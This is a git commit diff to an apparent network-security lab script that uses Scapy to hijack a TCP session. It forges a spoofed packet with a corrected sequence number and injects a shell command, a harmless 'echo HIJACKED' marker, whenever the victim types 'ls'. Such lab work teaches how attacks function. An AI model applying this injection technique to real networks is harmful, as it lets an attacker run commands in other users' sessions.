f5f3efe61dfef731ad5f4cf714008818c308e22d
Carlos Fernandes <carlosdf035@gmail.com>
2025-10-27 16:29:21 +0000

    top agr

--- Lab2/3.py
+++ Lab2/3.py
@@ -13,9 +13,7 @@ def SessionHijacking(pkt):
         if '\r' in buffer:
             if "ls" in buffer.strip():
                 ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)
-                seq = pkt[TCP].seq 
-                tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags="A", seq=seq, ack=pkt[TCP].ack)
-                
+                tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags="A", seq=pkt[TCP].seq + len(payload), ack=pkt[TCP].ack)
                 data = "echo HIJACKED > teste.txt\r\n"
                 pkt = ip/tcp/data
                 ls(pkt)
